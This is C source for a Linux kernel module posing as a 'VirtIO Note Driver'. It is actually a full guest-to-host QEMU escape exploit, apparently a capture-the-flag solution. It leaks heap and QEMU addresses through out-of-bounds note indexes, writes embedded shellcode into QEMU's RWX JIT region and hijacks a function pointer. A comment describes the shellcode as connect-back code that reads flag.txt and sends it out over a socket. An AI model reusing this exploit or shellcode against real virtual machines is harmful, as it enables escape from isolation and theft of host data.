#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/virtio.h>
#include <linux/virtio_config.h>
#include <uapi/linux/virtio_ids.h>
#include <linux/scatterlist.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("nobodyisnobody");
MODULE_DESCRIPTION("VirtIO Note Driver");

#define VIRTIO_ID_NOTE 42

#define READ 0
#define WRITE 1

// connect back shellcode, open flag.txt and send it on socket
unsigned char shellc[] = {0x48, 0x83, 0xec, 0x78, 0x6a, 0x29, 0x58, 0x99, 0x6a, 0x2, 0x5f, 0x6a, 0x1, 0x5e, 0xf, 0x5, 0x89, 0xc5, 0x97, 0xb0, 0x2a, 0x48, 0xb9, 0xfe, 0xff, 0xcf, 0x35, 0xfa, 0x0, 0x93, 0x3f, 0x48, 0xf7, 0xd9, 0x51, 0x54, 0x5e, 0xb2, 0x10, 0xf, 0x5, 0x48, 0x8d, 0x3d, 0x18, 0x0, 0x0, 0x0, 0x31, 0xf6, 0x6a, 0x2, 0x58, 0xf, 0x5, 0x89, 0xef, 0x89, 0xc6, 0x31, 0xd2, 0x6a, 0x78, 0x41, 0x5a, 0x6a, 0x28, 0x58, 0xf, 0x5, 0xeb, 0xfe, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74, 0x0};

typedef struct req_t {
    unsigned int idx;
    phys_addr_t addr;
    int op;
} req_t;

struct virtio_note_info {
    struct virtio_device *vdev;
    struct virtqueue *vq;
};

static void send_request(struct virtio_note_info *note_info, req_t *request_buff)
{
	unsigned int len;
    struct scatterlist sg;
    
    // Prepare scatter-gather list and add the buffer
    sg_init_one(&sg, request_buff, sizeof(req_t));
    if (virtqueue_add_outbuf(note_info->vq, &sg, 1, request_buff, GFP_KERNEL) < 0) {
        printk(KERN_ERR "VirtIO Note: Error adding buffer\n");
        return;
    }
    virtqueue_kick(note_info->vq);
    // Wait for the buffer to be used by the device
    while (virtqueue_get_buf(note_info->vq, &len) == NULL)
        cpu_relax();

}

static int virtio_note_probe(struct virtio_device *vdev)
{
struct virtio_note_info *note_info;
req_t *request_buff;
char *data;
char *data2;
uint64_t qemu_base, rwx_base;
uint64_t heap_addr, target, offset, shellcode_offset;

    note_info = kmalloc(sizeof(struct virtio_note_info), GFP_KERNEL);
    if (!note_info)
        return -ENOMEM;
   
    note_info->vdev = vdev;
    note_info->vq = virtio_find_single_vq(vdev, NULL, "note-queue");
    if (IS_ERR(note_info->vq)) {
        kfree(note_info);
        return PTR_ERR(note_info->vq);
    }

    // Allocate and prepare your request buffer
    request_buff = kmalloc(sizeof(req_t), GFP_KERNEL);
    if (!request_buff) {
        kfree(note_info);
        return -ENOMEM;
    }
    
    data = kmalloc(0x40, GFP_KERNEL);
    data2 = kmalloc(0x40, GFP_KERNEL);

    // leak heap address
    request_buff->idx = 26;      // Example index
    request_buff->addr = virt_to_phys(data); // Example address
    request_buff->op = READ;   // Example operation
    send_request(note_info, request_buff);
    heap_addr = *(uint64_t *)(data+0x10);
    printk(KERN_DEBUG "1st heap addr leaked:  0x%llx\n", heap_addr);

    // leak a qemu address to calculate qemu base
    request_buff->idx = 19;      // Example index
    request_buff->addr = virt_to_phys(data); // Example address
    request_buff->op = READ;   // Example operation
    send_request(note_info, request_buff);
    qemu_base = *(uint64_t *)(data+0x20) - 0x86c800;
    printk(KERN_DEBUG "qemu binary base leaked:  0x%llx\n", qemu_base);

    /* leak tcg_qemu_tb_exec value in qemu .bss to get RWX zone address*/
    *(uint64_t *)(data+0x10) = (qemu_base+0x1cffb80);
    // Prepare a WRITE request
    request_buff->idx = 19;      // Example index
    request_buff->addr = virt_to_phys(data); // Example address
    request_buff->op = WRITE;   // Example operation
    send_request(note_info, request_buff);

    // leak rwx zone address
    request_buff->idx = 32;      // Example index
    request_buff->addr = virt_to_phys(data2); // Example address
    request_buff->op = READ;   // Example operation
    send_request(note_info, request_buff);
    rwx_base = *(uint64_t *)data2;
    printk(KERN_DEBUG "rwx base leaked:  0x%llx\n", rwx_base);


	/* search for function virtio_note_handle_req on heap */
	target = qemu_base + 0x69f0d0;
	offset = 0;
    while (1)
    {
		*(uint64_t *)(data+0x10) = (heap_addr + offset);
		// Prepare a WRITE request
		request_buff->idx = 19;      // Example index
		request_buff->addr = virt_to_phys(data); // Example address
		request_buff->op = WRITE;   // Example operation
		send_request(note_info, request_buff);

		// read second heap addr
		request_buff->idx = 32;      // Example index
		request_buff->addr = virt_to_phys(data2); // Example address
		request_buff->op = READ;   // Example operation
		send_request(note_info, request_buff);
		if (*(uint64_t *)data2 == target)
			break;
		offset += 8;
	}
    printk(KERN_DEBUG "target found at:  0x%llx\n", heap_addr+offset);

	/* write our shellcode in rwx zone */
    shellcode_offset = 0x3ffe000;
    // rwx zone to copy shellcode
    *(uint64_t *)(data+0x10) = (rwx_base+shellcode_offset);
    // Prepare a WRITE request
    request_buff->idx = 19;      // Example index
    request_buff->addr = virt_to_phys(data); // Example address
    request_buff->op = WRITE;   // Example operation
    send_request(note_info, request_buff);

	memcpy(data2,shellc,64);
    // Example initialization of request
    request_buff->idx = 32;      // Example index
    request_buff->addr = virt_to_phys(data2); // Example address
    request_buff->op = WRITE;   // Example operation
    send_request(note_info, request_buff);

    // rwx zone to copy shellcode
    *(uint64_t *)(data+0x10) = (rwx_base+shellcode_offset+0x40);
    // Prepare a WRITE request
    request_buff->idx = 19;      // Example index
    request_buff->addr = virt_to_phys(data); // Example address
    request_buff->op = WRITE;   // Example operation
    send_request(note_info, request_buff);

	memcpy(data2,&shellc[64],sizeof(shellc)-64);
    // Example initialization of request
    request_buff->idx = 32;      // Example index
    request_buff->addr = virt_to_phys(data2); // Example address
    request_buff->op = WRITE;   // Example operation
    send_request(note_info, request_buff);

    printk(KERN_DEBUG "shellcode copied at:  0x%llx\n", rwx_base+shellcode_offset);

	/* overwrite virtio_note_handle_req on heap with our shellcode address */
	*(uint64_t *)(data+0x10) = (heap_addr + offset);
	// Prepare a WRITE request
	request_buff->idx = 19;      // Example index
	request_buff->addr = virt_to_phys(data); // Example address
	request_buff->op = WRITE;   // Example operation
	send_request(note_info, request_buff);
    // modify function ptr

    // read data 
    request_buff->idx = 32;      // Example index
    request_buff->addr = virt_to_phys(data2); // Example address
    request_buff->op = READ;   // Example operation
    send_request(note_info, request_buff);
    *(uint64_t *)data2 = (rwx_base+shellcode_offset);
    // write data back
    request_buff->idx = 32;      // Example index
    request_buff->addr = virt_to_phys(data2); // Example address
    request_buff->op = WRITE;   // Example operation
    send_request(note_info, request_buff);

 
    printk(KERN_DEBUG "executing shellcode...\n");

    // This one should get us code exec
    request_buff->idx = 19;      // Example index
    request_buff->addr = virt_to_phys(data); // Example address
    request_buff->op = READ;   // Example operation
    send_request(note_info, request_buff);

    kfree(data);
    kfree(request_buff);
    return 0;
}

static void virtio_note_remove(struct virtio_device *vdev)
{
    printk(KERN_INFO "VirtIO Note: Device removed\n");
    // Perform any necessary cleanup
}

static struct virtio_device_id id_table[] = {
    { VIRTIO_ID_NOTE, VIRTIO_DEV_ANY_ID },
    { 0 },
};

static struct virtio_driver virtio_note_driver = {
    .driver.name = KBUILD_MODNAME,
    .driver.owner = THIS_MODULE,
    .id_table = id_table,
    .probe = virtio_note_probe,
    .remove = virtio_note_remove,
};

static int __init virtio_note_init(void)
{
    return register_virtio_driver(&virtio_note_driver);
}

static void __exit virtio_note_exit(void)
{
    unregister_virtio_driver(&virtio_note_driver);
}

module_init(virtio_note_init);
module_exit(virtio_note_exit);

